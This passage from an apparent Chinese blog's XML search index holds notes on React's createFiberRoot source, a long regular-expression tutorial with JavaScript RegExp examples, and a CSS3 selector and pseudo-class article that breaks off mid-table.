ReactRoot，而 forceHydrate布尔类型参数在 hydrate 传入 true,在 render 里面传入 false。前者是服务器渲染，后者是客户端渲染。服务器渲染当服务器呈现标记的节点，React 会保留它并附加事件处理程序，从而具有高性能的首屏加载，客户端渲染当初始DOM与当前 DOM 存在差异，则可能会更改节点。可以看到 如果是 false会 container.removeChild(rootSibling) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function ReactRoot( container, isConcurrent, hydrate)&#123; const root = DOMRender.createContainer(container,isConcurrent,hydrate); this._internalRoot = root; &#125;// react-reconciler/inline.domfunction createContainer( containerInfo, isConcurrent, hydrate)&#123; // 创建 FiberRoot return createFiberRoot(container,isConcurrent,hydrate) &#125;// ReactFiberRootexport function createFiberRoot( containerInfo, isConcurrent, hydrate,): FiberRoot &#123; // const uninitializedFiber = createHostRootFiber(isConcurrent); let root; if (enableSchedulerTracing) &#123; root = &#123; current: uninitializedFiber, containerInfo: containerInfo, pendingChildren: null, earliestPendingTime: NoWork, latestPendingTime: NoWork, earliestSuspendedTime: NoWork, latestSuspendedTime: NoWork, latestPingedTime: NoWork, didError: false, pendingCommitExpirationTime: NoWork, finishedWork: null, timeoutHandle: noTimeout, context: null, pendingContext: null, hydrate, nextExpirationTimeToWorkOn: NoWork, expirationTime: NoWork, firstBatch: null, nextScheduledRoot: null, interactionThreadID: unstable_getThreadID(), memoizedInteractions: new Set(), pendingInteractionMap: new Map(), &#125;; &#125; else &#123; root = &#123; current: uninitializedFiber, containerInfo: containerInfo, pendingChildren: null, earliestPendingTime: NoWork, latestPendingTime: NoWork, earliestSuspendedTime: NoWork, latestSuspendedTime: NoWork, latestPingedTime: NoWork, didError: false, pendingCommitExpirationTime: NoWork, finishedWork: null, timeoutHandle: noTimeout, context: null, pendingContext: null, hydrate, nextExpirationTimeToWorkOn: NoWork, expirationTime: NoWork, firstBatch: null, nextScheduledRoot: null, &#125;; uninitializedFiber.stateNode = root; return root; &#125;]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2019-06-25-regExp.html</url>
    <content type="text"><![CDATA[最近这段时间因为赶项目，一直没有更新博客。精通正则这本书一年前翻阅过过一些。用到的地方不多，便很快就忘记了。今忙里抽空复习一下正则，在项目中也会有所用到。主要是跟随正则表达式30分钟入门教程，再结合 JS 中的正则表达式进行复习。 正则表达式定义编写处理字符串的程序或者网页时候，经常会有查找符合复杂规则的字符串的需要。正则表达式就是用于描述这些规。即记录文本规则的代码。 入门在一篇英文小说中查找 hi，可以使用正则 hi。它可以精确匹配这样的字符串：由两个字符组成，前一个字符是 h，后一个字符串是 i。通常，处理正则表达式的工具会提供一个忽略大小写的选项，如果选中了这个选项，可以匹配 hi、HI、Hi、hI这四种情况中的任意的一种。 hi这个正则表达式也会匹配 him、history、high等，如果要精确查找到 hi这个单词的话，应该使用正则表达式 \bhi\b。 \b是正则表达式规定一个特殊代码（元字符），代表着单词的开头或者结尾，也就是单词的分界处。英文的单词一般是由空格，标点符号或者换行符来分隔的，但是 \b并不匹配这些单词分隔字符中的任何一个，它只匹配一个位置。 如果要找到是 hi后面不远处跟着一个 Lucy，就要使用正则表达式 \bhi\b.*\bLucy\b。这里的 .是一个元字符，匹配除了换行符外的任意字符。*同样是元字符，不过它代表的不是字符，也不是位置。而是数量，它指定 *前边的内容可以连续重复使用任意次以使整个正则表达式得到匹配。因此 .*连在一起就意味着任意数量的不包括换行的字符。现在 \bhi\b.*\bLucy\b的意思就是：先是一个单词hi，然后是任意个任意字符（但不能是换行），最后是 Lucy整个单词。 如果使用其他元字符，可以构造更强大的正则表达式，比如下面的例子 12345670\d\d-\d\d\d\d\d\d\d\d# 以 0 开头，然后是两个数字，然后是一个连字符'-'，最后是8个数字（也就是中国的电话号码，只能匹配区号是3位的情况）# \d 是一个新的元字符。匹配一个数字。'-'不是元字符，只匹配它本身——连字符（或者减号，或者中横线等）# 简化0\d&#123;2&#125;-d&#123;8&#125;# \d 后面&#123;2&#125; 和 &#123;8&#125;的意思必须连续重复匹配2（8）次 元字符常用的元字符 代码 说明 相当于 . 匹配换行符以外的任意字符 \w 匹配字母或数字或下划线或汉字 \s 匹配任意的空白符（包括空格、制表符（Tab）、换行符，中文全角空格） \d 匹配数字 \b 匹配单词的开始或者结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 元字符 ^和 $都匹配一个位置，这和 \b有点类似。^匹配想要用来查找的字符串的开头，$匹配结尾。 \d+匹配1个或者更多连续的数字。+是和 *类似的元字符，不同的是 *匹配重复任意次（可能是0次），而 +则匹配重复1次或者更多次。 \b\w{6}\b匹配刚好 6个字符的单词 \d{5,12} 表示匹配字符串里面包含 5 到 12 连续位数字，而不是整个字符串是 5 到 12 位数字 ^\d{5,12}$则是精确匹配整个字符串就是 5 到 12 位数字 字符转义如果想要查找元字符本身的话，比如查找.或者 *就需要转义，\可以来取消这些字符的特殊意义 12345678# 查找 .\.# 查找 *\* # 查找 \\\ 重复下面是正则表达式中所有限定符（指定数量的代码） 代码/语法 说明 * 重复0次或者更多次 + 重复1次或者更多次 ？ 重复0次或者1次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n次到m次 Windows\d+ 匹配 Windows后面跟1个或者跟多数字 ^\w+匹配一行的第一个单词（或者整个字符串的第一个单词） 字符类要想查找数字、字母或者数字，空白是很简单的，因为已经有对应的这些字符集合的元字符，但是想匹配没有预定字符的字符集合（比如元音字母 a/e/i/o/u）。 只需要在方括号中列出它们就可以了,[aeiou]就匹配任何一个英文元音字母，[.?!]匹配标点符号（.或?或!） 也可以轻松指定一个字符范围，[0-9]的含义和 \d是完全一致的：一个数字。 [a-z0-9A-Z]也完全等同于 \w（如果值考虑英文的话） 思考： \(?0\d{2}[) -]?\d{8} 上面的表达式，可以匹配几种格式的电话号码，像（010）88888888，或者010-88888888。它首先是一个转义字符，它能出现0次或者1次（？）,然后是一个0，后面跟着两个数字（d{2}），然后是）或者-或者空格中的一个，它出现1次或者不出现，最后是8个数字。 分枝条件上面思考题，其实也可以匹配 010)8888888或者 （010-88888888 这样不正确的格式。要解决这个问题，需要用到分枝条件。正则表达式里面的分枝条件是有几种规则的。如果满足其中任意一个规则应该都当成匹配，具体的方法是用 |把不同的规则都分隔开。 12345670\d&#123;2&#125;-\d&#123;8&#125;|0\d&#123;3&#125;-d&#123;7&#125;# 这个表达式可以匹配两种连字符分隔的电话号码：一种是三位区号的，8位本地号。另一种是4位区号的，7个本地号的\(0\d&#123;2&#125;\)[- ]?\d&#123;8&#125;|0\d&#123;2&#125;[- ]?\d&#123;8&#125;# 这个表达式匹配3位区号的电话号码，其中区号可以用小括号括起来，也可以不用，区号与本地号间可以用连字号或空格间隔，也可以没有间隔。可以试试用分支条件把这个表达式扩展成支持4位区号的\d&#123;5&#125;-\d&#123;4&#125;|\d&#123;5&#125;# 这个表达式用于匹配美国的邮政编码。它的规则是5位数字，或者用连字号间隔的9位数字。# 这要需要注意，不能改成 \d&#123;5&#125;|\d&#123;5&#125;-d&#123;4&#125;，这样就只会匹配5位邮编（以及9位邮编的前5位）。原因是匹配分支条件时，会从左到右测试每个条件，如果满足了某个分支的话，就不会去管其他条件了。 分组重复单个字符，直接在字符后面加上限定符就好了。如果想要重复多个字符的话，可以用小括号来指定子表达式（分组），然后就可以指定这个子表达式的重复次数了，或者是其他的操作。 123456（\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;# 上面是一个简答的 ip地址匹配。\d&#123;1,3&#125;匹配1到3位数字# (\d&#123;1,3&#125;\.)&#123;3&#125;匹配三位数字加上一个英文句号，这个整体也是这个分组重复了3次，最后再加上一个1到3位的数字 \d&#123;1,3&#125;# 缺漏的地方在于它也会匹配 256.300.899.999 这种不存在的ip 地址。# 正确的地址(ip地址中每个数字都不能大于255，可以有前导0)((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?) 反义有时候需要查找的不是某个能简单定义的字符类的字符。比如想查找除了数字以外的，其他任意字符都行的情况，这时候就需要反义。 代码/语法 说明 \W 匹配任意不是字母、数字、下划线或者汉字的字符 \S 匹配任意不是空白符的字符 \D 匹配任意不是数字的字符 \B 匹配不是单词开头或者结束的位置 [^X] 匹配除了 X 以外的任意的字符 [^aeiou] 匹配除了 aeiou 这个字母与以外的任意字符 例子： \S+匹配不包括空白符的字符串 &lt;a[^&gt;]+&gt;匹配用尖括号括起来的以 a开头的字符串 后向引用使用小括号指定一个子表达式后，匹配这个子表达式的文本（也就是此分组捕获的内容）可以在表达式或者其他程序中作进一步的处理。默认情况下，每个分组都会自动拥有一个组号，规则就是：从左到右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，依次类推。 分组0代表整个正则表达式，实际上组号分配过程是要从左向右扫描两遍的，第一遍只给未命名组分配，第二遍只给命名组分配，因为所有命名组的组号都大于未命名的组号。 可以使用 (?:exp)这样的语法来剥夺一个分组对组号分配的参与权 后向引用，用于重复搜索前面的某个分组匹配的文本。例如，\1代表分组1匹配的文本。 12\b(\w+)\b\s+\1\b# 匹配重复的单词，这个表达式首先是一个单词，也就是单词开始处和单词结束处之间多于一个的字母或者数字（\b(\w+)\b），这个单词会被捕获到编码为1的分组中，然后是1个或者几个空白符(\s+)，最后分组1中捕获的内容（也就是前面匹配的那个单词）（\1） 也可以自己指定子表达式的组名，要指定一个子表达式的组名，使用这样的语法: (?&lt;Word&gt;\w+)或者(?&#39;Word&#39;\w+)这样就把 \w的组名指定为 Word。要反向引用这个分组捕获的内容，可以使用\k&lt;Word&gt;，上面的例子也可以写成这样： 1\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b 下表是常用分组语法： 分类 代码/语法 说明 捕获 (exp) 匹配 exp,并捕获文本到自动命名的组里 (?\exp) 匹配 exp，并捕获文本到名称为 name 的组里，也可以写成 (?&#39;name&#39;exp) (?:exp) 匹配 exp，不捕获匹配的文本，也不给此分组的分配组号 零宽断言 (?= exp) 匹配 exp 前面的位置 (?&lt;= exp) 匹配 exp 后面的位置 (?!exp) 匹配后面跟的不是 exp 的位置 (?&lt;!exp) 匹配前面不是 exp 的位置 注释 (?#comment) 这种类型的分组不对正则表达式的处理产生任何影响，用于注释让人阅读 零宽断言断言用来声明一个应该为真的事实，正则表达式中只有当断言为真的时候才会继续进行匹配。 用于查找在某些内容前或者之后的东西，像 \b、^、$那样用于指定一个位置，这个位置应该满足一定的条件（断言），因此它们被称为零宽断言。 (?=exp)也叫零宽度正预测先行断言（Zero-width positive lookahead），它断言自身出现的位置的后面能匹配表达式 exp。比如，\b\w+(?=ing\b)，匹配以 ing为结尾的单词的前面部分（除了 ing 以外的部分），如查找 I&#39;m singing while you&#39;re dancing.时，它会匹配 sing和 danc (?&lt;=exp)也叫零宽度正回顾后发断言(Zero-width positive lookbehind)，它断言自身出现的为位置的前面能匹配表示达 exp，比如 (?&lt;=\bre)\w+\b会匹配以 re开头的单词的后半部分（除了re 以外的部分）。例如在查找 reading a book时，它匹配 ading。 假如想要给一个很长的数字中每三位加一个逗号，从右边加。可以这样查找前面和里面添加逗号的部分： 123456((?&lt;=\d)\d&#123;3&#125;)+\b# 查找 1234567890 =&gt; 234567890（?&lt;=\s）\d+(?=\s)# 匹配以空白符间隔的数字，不包括这些空白符# 查找 1234 56 7890 =&gt; 56 负向零宽断言前面提到怎么查找不是某个字符或者不在某个字符类里面的字符的方法（反义）。但是如果我们只是想确保某个字符没有出现，但不想去匹配它时，例如查找这样的单词——它里面的出现了字母q,但是q后面跟着的不是字母 u，我们可以尝试： 1234\b\w*q[^u]\w*\b# 匹配包含后面不是字母u 的字母q的单词。但是你可以发现 [^u]总要匹配一个字符，所以如果q是单词的最后一个字符的话，后面的[^u]总要匹配一个字符，或者是句号或者是其他的什么。后面的 \w*\b 将会匹配下一个单词，于是 上面的表达式就可以匹配整个 Iraq fighting。# 负向零宽断言能解决这样的问题，因为它只匹配一个位置，并不消费任何字符。\b\w*q(?!u)\w*\b 零宽度负预测先行断言(?!exp)(Zero-width negative lookahead)，断言此位置后面不能匹配表达式exp。 例如： 1234\d&#123;3&#125;(?!\d)# 匹配三位数字，而且这三位数字的后面不能是数字\b((?!abc)\w)+\b# 匹配不包括连续字符串 abc 的单词 同理可以用零宽度负回顾后发断言(?&lt;!exp)(Zero-width negative lookbehind)，来断言此位置的前面不能匹配表达式 (?&lt;![a-z])\d{7},即前面不是小写字母的七位数字 一个更加复杂的例子： (?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;) 匹配不包含属性的简单 html 标签内的内容。(?&lt;=&lt;(\w+)&gt;)指定了这样的前缀：被尖括号括起来的单词，然后是 .*(任意的字符串)，最后一个是后缀(?=&lt;\/\1&gt;)。\/转义了，\1反向引用，整个内容就是闭合标签之间的内容，不包括两个标签本身。 注释小括号的另一种用途是通过语法(?#comment)来包含注释。 例如： 12[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199) 要包含注释的话，最好是启用“忽略模式里面的空白符”选项。这样在编写表达式时能任意的添加空格/TAB/换行，而实际使用时这些都被忽略。启用这个选项后，在 #后面到这一行结束的所有文本都被当做注释忽略掉。例如，我们可以前面的一个表达式写成这样： 1234567(?&lt;= # 断言要匹配的文本的前缀&lt;(\w+)&gt; # 查找尖括号括起来的字母或者数字（即HTML/XML标签）) # 前缀结束.* # 匹配任意文本(?= # 断言要匹配的文本的后缀&lt;\/\1&gt; # 查找尖括号括起来的内容：前面是一个 '/'，后面是先前捕获的标签) # 后缀结束 贪婪与懒惰当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。以这个表达式为例子：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索 aabab的话，它就会匹配整个 aabab，这被称为贪婪匹配。 有时候，我们需要懒惰匹配，也就是尽可能少的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号 ?。这样，.?这意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。 a.*?b匹配最短的，以a开始，以b结束的字符串。如果把它应用于 aabab的话，它会匹配 aab和 ab 代码/语法 说明 *? 重复任意次，但尽可能少重复 +? 重复 1次或者更多次，但尽可能少重复 ?? 重复 0 次或者 1 次，但尽可能少重复 {n,m}？ 重复 n 到 m 次，但尽可能少重复 {n,}? 重复 n 次以上，但尽可能少重复 JS 中的正则表达式正则表达式是用于匹配字符串中字符组合的模式。在 JavaScript 中，正则表达式也是对象，这些模式被用于 RegExp的test和 exec，以及 String的 match、replace、search和 split方法。 创建一个正则表达式1.使用一个正则表达式字面量，其由包含斜杠之间的模式组成： 12const regex = /ab+c/;const regex = /^[a-zA-Z]+[0-9]*\W?_$/gi 2.调用RegExp对象的构造函数： 123let regex = new RegExp('ab+c');let regex = new RegExp(/^[a-zA-Z]+[0-9]*\W?_$/,'gi')let regex = new RegExp("^[a-zA-Z]+[0-9]*\\W?_$","gi") 编写一个正则表达式的模式一个正则表达式的模式由简单的字符所构成，比如 /abc/，或是简单和特殊字符的组合，比如 /ab*c/或者 /Chapter(\d+)\.\d*/。后者用到了括号，它在正则表达中可以被当作是一个记忆设备。这一部分正则所匹配的字符会被记住，在后面可以利用。 使用简单的模式 简单的模式由找到的直接匹配所构成的。 1234/abc/// 匹配 Hi, do you know your abc's? // 匹配 The latest airplane designs evolved from slabcraft.? // 不匹配 Grab crab 使用特殊字符 12/ab*c/// 匹配 cbbabbbbcdebc =&gt; abbbbc 字符 含义 \ 在非特殊字符之前的反斜杆表示下一个字符是特殊的。反斜杆也可以将其后的特殊字符，转义为字面量。使用 new RegExp(&#39;pattern&#39;)的时候要将 \转义，因为 \在字符串里面也是一个转义字符 ^ 匹配输入的开始。如果多行标志被设置为 true，那么也匹配换行符后紧跟的位置。 $ 匹配输入的结束。如果多行标识符被设置为 true，那么也会匹配换行符之前的位置。0 * 匹配前一个表示0 次或者多次。等价于{0,} + 匹配前面一个表达式1次或者更多次，等价于 {1,} ? 匹配前面一个表达式0次或者1次。等价于{0,1}如果紧跟在任何量词 *、+、?、{}后面，将会使得量词变成非贪婪（匹配尽量少的字符），和缺省使用的贪婪模式（匹配尽可能多的字符）正好相反 . （小数点）匹配除换行符之外面的任何单个字符 (x) 匹配 ‘x’并记住匹配项。括号被称为捕获括号。模式/(foo)(bar)\1\2/在正式表达式的替换环节，使用 $1的语法，例如 &#39;bar.foo&#39;.replace(/(..)(..)/,&#39;$2$1&#39;) (?:x) 匹配‘x’但不记住匹配项。这种叫做非捕获括号，使得你能够定义与正则表达式运算符一起使用的子表达式。 x(?=y) 匹配‘x’仅仅当’x’后面跟着‘y’。这种叫先行断言。/Jack(?=Spart)/会匹配到 ‘Jack’仅当它后面跟着’Spart’。但是‘Spart’都不是匹配结果中的一部分 (?&lt;=y)x 匹配‘x’仅仅当’x’前面是‘y’,这种叫做后行断言。/(?&lt;=Jack)Spart/会匹配到 ‘Spart’仅仅当它前面是‘Jack’。`/(?&lt;=Jack Tom)Spart/`会匹配到 ’Spart‘仅仅当它前面是 ’Jack‘或者是 ‘Tom’。但是’Tom‘和’Jack‘都不是匹配结果的一部分 x(?！y) 匹配’x‘仅仅当’x‘后面不跟着’y‘,这个叫做正向否定查找。/\d+(?!\.)/匹配一个数字仅仅当这个数字后面没有跟小数点的时候。 `x y` 匹配’x‘或者’y‘。 {n} n是一个正整数，匹配了前面一个字符刚好发生了 n 次 {n,m} n 和 m 都是整数。匹配前面的字符至少 n 次，最多 m 次。如果 n 或者 m 的值是0，这个值会被忽略。 [xyz] 一个字符的集合。匹配方括号中的任意字符，包括转义序列。可以用破折号（-）来指定一个字符范围。对于点（.）和星号（*）这样的特殊符号在一个字符集中没有特殊意义。 [^xyz] 一个反向字符集。匹配任何没有包含在方括号中的字符。同样可以使用破折号来指定一个字符范围。 [\b] 匹配一个退格(U+0008) \b 匹配一个词的边界。一个词的边界就是一个词不被另外一个字字符跟随的位置或者没有其他“字”字符在其前面的位置。 \B 匹配一个非单词边界。匹配一个前后字符都是相同类型的位置。都是’字‘字符或者都不是’字‘字符。一个字符串的开始和结尾都被认为不是‘字’字符，或者是字符串。 \cX 当 X 是处于A 到 Z 之间的字符的时候，匹配字符串中的一个控制符 \d 匹配一个数字 \D 匹配一个非数字字符 \f 匹配一个换页符（U+000C） \n 匹配一个换行符（U+000A） \r 匹配一个回车符（U+000D） \s 匹配一个空白符号，包括空格、制表符、换页符和换行符。等价于[\f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff] \S 匹配一个非空白字符。等价于[^\f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]。 \t 匹配一个水平制表符（U+0009） \v 匹配一个垂直制表符（U+000B） \w 匹配一个单字字符（字母、数字或者下划线）等价于 [A-Za-z0-9_] \W 匹配一个单字字符等价于 [^A-Za-z0-9_] \n 在正则表达式中，它返回最后的第 n 个子捕获匹配的子字符串（捕获的数目以左括号计数） \0 匹配 NULL(U+0000)字符，不要在这后面跟着其他小数，因为 \0&lt;digits&gt;是一个八进制转义序列 \xhh 与代码 hh 匹配字符（两个十六进制数字） \uhhhh 与代码 hhhh匹配字符（四个十六进制数字） 使用正则表达式正则表达式被用于 RegExp 的 exec 和 test 方法，还有 String 的 match、replace、search和 split 方法。 方法 描述 exec 一个在字符串中执行查找匹配的 RegExp 方法，它返回一个数组(未匹配返回 null) test 一个在字符串中测试是否匹配的 RegExp 方法，它返回 true 或者 false match 一个在字符串中执行查找匹配的 String 方法，它返回一个数组或者在未匹配时返回 null search 一个在字符串中测试匹配的 String 方法，它返回匹配到的位置索引，或者在失败时返回 -1 replace 一个在字符串中执行查找匹配的 String 方法，并且使用替换字符串替换掉后面的子字符串 split 一个使用正则表达式或者一个固定字符串分隔一个字符串，并将分隔后的字符串存储到数组中的 String 方法 例子： 12345678910111213141516171819// 脚本使用 exec 方法在一个字符串中查找一个匹配let reg = /d(b+)d/g;/**reg参数* 5 lastIndex 下一个匹配的索引值* "d(b+)d" source 模式文本。在正则表达式创建时更新，不执行*/let myArray = reg.exec("cdbbdbsbz")myArray; // ["dbbd", "bb", index: 1, input: "cdbbdbsbz", groups: undefined]/** myArray参数* ["dbbd,bb"] 匹配到的字符和所有被记住的子字符串* 1 1input 初始字符串* input:cdbbdbsbz 初始字符串*/// 不需要访问正则表达式的属性，通过另一个方法来创建myArray = /d(b+)d/g.exec("cdbbdbsbz")// 通过一个字符串构建正则表达式，还有另一种方式reg = new RegExp("d(b+)d","g");myArray = reg.exec("cdbbdbsbz") 使用括号的子字符串匹配一个正则表达式模式使用括号，将导致相应的子匹配被记住。使用括号匹配的子字符串的数量是无限的。返回的数组中保存所有被发现的子匹配。 1234let reg = /(\w+)\s(\w+)/;let str = 'John Smith';let newStr = str.replace(reg,"$2,$1")newStr; // "Smith,John" 通过标志进行高级搜索正则表达式有四个可选参数进行全局和不区分大小写搜索，这些参数可以单独使用也可以一起使用在任何顺序和包含正则表达式的部分中。 标志 描述 g 全局搜索 i 不区分大小写搜索 m 多行搜索(使用该标志，^和 $匹配的开始或者结束输入字符串的) y 执行“粘性”搜索，匹配从目标字符串的当前位置开始，可以使用 y标志 格式： 12345let reg = /pattern/flags;let reg = /\w+\s/g;// 或者reg = new RegExp("pattern","flags")reg = new RegExp("\\w+\\s","g")]]></content>
      <categories>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试官问我HTML5是什么（下）]]></title>
    <url>%2F%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E6%88%91HTML5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%8B%EF%BC%89.html</url>
    <content type="text"><![CDATA[CSS3发展历史 1CSS1 -&gt; CSS2 -&gt; CSS2.1 -&gt;CSS3 模块与模块化结构 CSS3采用了分工协作的模块化结构 其中最重要的 CSS3 模块包括： 选择器 框模型 背景和边框 文本效果 2D/3D 转换 动画 多列布局 用户界面 CSS3 新增的选择器属性选择器 选择器 含义 实例 E[att^=”val”] 属性 att的值以 val开头的元素 div[id^=&#39;haha&#39;] E[att$=”val”] 属性 att的值以 val结尾的元素 div[id^=&#39;haha&#39;] E[att=”val”] 属性 att的值包含 val字符串的元素 div[id^=&#39;haha&#39;] 结构性伪类选择器 选择器 含义 实例 E:root 匹配文档的根元素，对于 HTML 文档就是 HTML元素 E:not(s) 匹配不符合当前选择器的任何元素 div:not([class=&quot;demo&quot;]):除了class为demo的div以外 E:empty 匹配一个不包含任何子元素的元素（文本节点也被看成子元素，空格也是一个元素） E:target 匹配被 location.hash选中的元素（即锚点元素），选择器可以用来选取当前活动的目标元素 E:first-child 匹配E父元素的第一个子元素,如果当前位置元素不是前面所修饰的元素，那么无效 li:first-child:匹配页面中所有第一个li E:last-child 匹配E父元素的最后一个子元素，等同于 E:nth-last-child(1),如果当前位置元素不是前面所修饰的元素，那么无效 E:nth-child(n) 匹配E父元素的第n个元素，第一个编号为1,如果当前位置元素不是前面所修饰的元素，那么无效 E:nth–last-child(n) 匹配E父元素的倒数第n个子元素，第一个编号为1,如果当前位置元素不是前面所修饰的元素，那么无效 E:nth-of-type(n) 与E:nth-child()类似，但是仅匹配使用同种标签的元素 p:nth-of-type(2):匹配父元素的第2个子元素p E:first-of-type(n) 匹配父元素使用同种标签的第一个子元素，等同于 E:nth-of-type(1) E:last-of-type(n) 匹配父元素使用同种标签的最后一个子元素，等同于 E:nth-last-of-type(1) E:nth-last-of-type(n) 与 E:nth-last-child(n)类似，但是仅匹配使用相同标签的元素 E:only-child 匹配父元素下仅有的一个子元素，等同于 E:first-child:last-child或者 E:nth-child(1):nth-last-child(1) E：only-of-type 匹配父元素下使用同种标签的唯一一个子元素，等同于 E:first-of-type:last-of-type或者 E:nth-of-type(1):nth-last-of-type(1) 备注： n里面可以是 odd(奇数)、even(偶数) 循环使用样式：li:nth-child(2n+1) UI状态伪类选择器 选择器 含义 实例 E:enabled 匹配表单中激活的元素 E:disabled 匹配表单中禁用的元素 E:checked 匹配表单中被选中的单选框或者复选框 E::selection 匹配用户用鼠标当前选中的元素 user-select: none;取消鼠标选中的默认样式 E:read-only 匹配选中只读的元素 &lt;input type=&quot;text&quot; readonly=&quot;readonly&quot; value=&quot;hahha&quot;/&gt; E:read-write 匹配选中非只读的元素 &lt;input type=&quot;text&quot; value=&quot;hahha&quot;/&gt; 级元素通用选择器 选择器 含义 实例 E~F 匹配任何在 E元素之后的同级元素 F p~ul{background:#ff9;} E：hover E：active E：focus E：enabled E：disabled E：read-only E：read-write E：checked E：default E：indeterminate E：selection 属性选择器 简单属性选择 12345678/*把包含某个attribute的所有边元素变成红色*/*[attribute]&#123;color:red&#125;/*只对有attribute属性的div元素应用样式*/div[attribute]&#123;color:red&#125;/*根据多个属性，同时拥有attribute1和attribute2的元div应用样式*/div[attribute1][attribute2]&#123;color:red&#125;/*对有alt属性的图像*/img[alt]&#123;border:5px solid red&#125; 根据具体属性选择 123456/*某个具体的a标签*/a[href="http://laibh.top"]&#123;color:red&#125;;/*加多一个限制*/a[href="http://laibh.top"][title="赖同学"]&#123;color:red&#125;;/*不要忽略空格*/p[class="red small"]&#123;color:red&#125;; 根据部分属性值选择 12/*选择 class属性中包含 important元素的 */p[class~="important"]&#123;color:red&#125; 类型 描述 [abc^=”def”] 选择 abc 属性值以 “def” 开头的所有元素 [abc$=”def”] 选择 abc 属性值以 “def” 结尾的所有元素 [abc*=”def”] 选择 abc 属性值中包含子串 “def” 的所有元素 特定属性选择类型 12/*这个规则会选择 lang 属性等于 en 或以 en- 开头的所有元素*/*[lang|="en"]&#123;color:red&#125; css属性选择器表 选择器 描述 [attribute] 用于选取带有指定属性的元素。 [attribute=value] 用于选取带有指定属性和值的元素。 [attribute~=value] 用于选取属性值中包含指定词汇的元素。 [attribute\ =value] 用于选取带有以指定值开头的属性值的元素，该值必须是整个单词。 [attribute^=value] 匹配属性值以指定值开头的每个元素。（CSS3新增） [attribute$=value] 匹配属性值以指定值结尾的每个元素。（CSS3新增） [attribute**=value*] 匹配属性值中包含指定值的每个元素。（CSS3新增） 伪类与伪元素伪类CSS2定义：用于向某些选择器添加特殊的效果。 CSS3定义： 伪类的存在是为了通过选择器找到那些不存于DOM树中的信息以及不能被常规 CSS选择器获取到的信息（:target） 伪类由一个冒号:开头，冒号后面是伪类的名称和包含在圆括号中的可选参数 任何常规选择器都可以在任何位置使用伪类。伪类语法不区分大小写。一些伪类的作用会互斥，另外一些伪类可以同时被同一个元素使用。并且，为了满足用户在操作 DOM时产生的 DOM 结构变化，伪类也可以是动态的 12selector : pseudo-class&#123; property:value &#125;selector.class : pseudo-class&#123; property:value &#125; 锚伪类（不存在于 DOM树的信息） 1234a:link&#123;&#125;a:visited&#123;&#125;a:hover&#123;&#125;a;active&#123;&#125; 123456789101112131415161718&lt;style&gt;.tab_content &#123; height: 800px; background: red; margin-bottom: 100px;&#125;#tab1:target, #tab2:target, #tab3:target &#123; background:blue;&#125; &lt;/style&gt;&lt;div id="tab1" class="tab_content"&gt;&lt;!--tabed content--&gt;&lt;/div&gt;&lt;div id="tab2" class="tab_content"&gt;&lt;!--tabed content--&gt;&lt;/div&gt;&lt;div id="tab3" class="tab_content"&gt;&lt;!--tabed content--&gt;&lt;/div&gt;&lt;!--:target通过CSS实现了常规CSS无法实现的逻辑--&gt; 伪类表 属性 描述 CSS :active 向被激活的元素添加样式。 1 :focus 向拥有键盘输入焦点的元素添加样式。 2 :hover 当鼠标悬浮在元素上方时，向元素添加样式。 1 :link 向未被访问的链接添加样式。 1 :visited 向已被访问的链接添加样式。 1 :first-child 向元素的第一个子元素添加样式。 2 :lang 向带有指定 lang 属性的元素添加样式。 2 伪元素CSS2定义：用于向某些选择器设置特殊效果 CSS3定义： 伪元素在DOM树中创建了一些抽象元素，这些抽象元素是不存在文档语言里面的（html源码）。如：document接口不提供访问元素内容的第一个字或者第一行的机制，而伪元素可以使得开发者提取到这些信息。并且，一些伪元素可以使开发者获取到不存在与源文档中的内容（:before/:after） 伪元素由两个冒号:：开头，然后是伪元素的名称 使用::是为了区分伪类和伪元素（CSS2中没有区别）。考虑兼容性的话，CSS2中的已存伪元素可以使用 :，但是 CSS3的就要使用 :: 一个选择器只能使用一个伪元素，并且伪元素必须处于选择器语句的最后 12selector:pseudo-element&#123;property:value&#125;selector.class:pseudo-element&#123;property:value&#125; :first-line 用于向文本的首行设置特殊样式(只能用于块级元素) 下面属性可以应用这个伪元素 font color background word-spacing letter-spacing text-decoration vertical-align text-transform line-height clear :first-letter 用于向文本的首字母设置特殊样式 下面的属性可以应用这个伪元素 font color background margin padding border text-decoration vertical-align(当 float为none) text-transform line-height float clear :before 在元素内容前面插入新内容 :after 在元素内容之后插入新内容 伪元素表 属性 描述 CSS :first-letter 向文本的第一个字母添加特殊样式。 1 :first-line 向文本的首行添加特殊样式。 1 :before 在元素之前添加内容。 2 :after 在元素之后添加内容。 2 伪类与伪元素特性与区别 伪类本质上是为了弥补常规 CSS 选择器的不足，以便获取更多的信息（不存在 DOM树的信息，不能被常规CSS选择器获取的信息） 伪元素本质上是创建了一个有内容的虚拟容器,这个容器不包含任何DOM元素，但是可以包含内容 CSS3 中的伪类和伪元素的语法不同（:与::） 可以同时使用多个伪类，而只能同时使用一个伪元素 完整表格 选择器 示例 示例说明 CSS .class .intro 选择所有class=”intro”的元素 1 #id 